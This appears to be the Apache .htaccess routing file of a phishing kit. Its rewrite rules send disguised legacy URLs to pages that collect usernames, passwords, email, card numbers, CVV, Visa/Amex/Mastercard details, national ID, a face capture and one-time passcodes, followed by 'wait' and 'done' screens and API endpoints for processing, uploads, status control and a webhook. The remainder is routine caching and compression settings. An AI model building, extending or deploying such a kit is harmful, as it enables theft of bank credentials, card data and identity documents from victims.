<IfModule mod_rewrite.c>
RewriteEngine On

# Legacy -> new routes (internal rewrite, keeps method/query)
RewriteRule ^scriptabeja\.php$ flows/home.php [L,QSA]

RewriteRule ^_user\.php$ flows/user.php [L,QSA]
RewriteRule ^_pass\.php$ flows/pass.php [L,QSA]
RewriteRule ^_email\.php$ flows/email.php [L,QSA]
RewriteRule ^_card\.php$ flows/card.php [L,QSA]
RewriteRule ^_cedula\.php$ flows/id.php [L,QSA]
RewriteRule ^soyyo\.php$ flows/face.php [L,QSA]
RewriteRule ^_otp\.php$ flows/otp.php [L,QSA]
RewriteRule ^923\.php$ flows/e923.php [L,QSA]
RewriteRule ^_wait\.php$ flows/wait.php [L,QSA]
RewriteRule ^_end\.php$ flows/done.php [L,QSA]
RewriteRule ^error404\.php$ flows/err.php [L,QSA]
RewriteRule ^cvv\.php$ flows/cvv.php [L,QSA]
RewriteRule ^visa\.php$ flows/visa.php [L,QSA]
RewriteRule ^amex\.php$ flows/amex.php [L,QSA]
RewriteRule ^master\.php$ flows/master.php [L,QSA]

RewriteRule ^processing\.php$ api/flow.php [L,QSA]
RewriteRule ^upload\.php$ api/media.php [L,QSA]
RewriteRule ^set_status\.php$ api/state.php [L,QSA]
RewriteRule ^webhook\.php$ api/hook.php [L,QSA]
RewriteRule ^_error\.php$ api/elog.php [L,QSA]
</IfModule>

<IfModule mod_deflate.c>
AddOutputFilterByType DEFLATE text/html text/plain text/xml text/css text/javascript application/javascript application/json application/xml image/svg+xml
</IfModule>

<IfModule mod_expires.c>
ExpiresActive On
ExpiresByType text/css "access plus 7 days"
ExpiresByType text/javascript "access plus 7 days"
ExpiresByType application/javascript "access plus 7 days"
ExpiresByType application/json "access plus 1 day"
ExpiresByType image/svg+xml "access plus 30 days"
ExpiresByType image/jpeg "access plus 30 days"
ExpiresByType image/png "access plus 30 days"
ExpiresByType image/gif "access plus 30 days"
ExpiresDefault "access plus 1 day"
</IfModule>

<IfModule mod_headers.c>
<FilesMatch "\.(css|js)$">
Header set Cache-Control "public, max-age=604800"
</FilesMatch>
<FilesMatch "\.(jpe?g|png|gif|svg)$">
Header set Cache-Control "public, max-age=2592000"
</FilesMatch>
</IfModule>
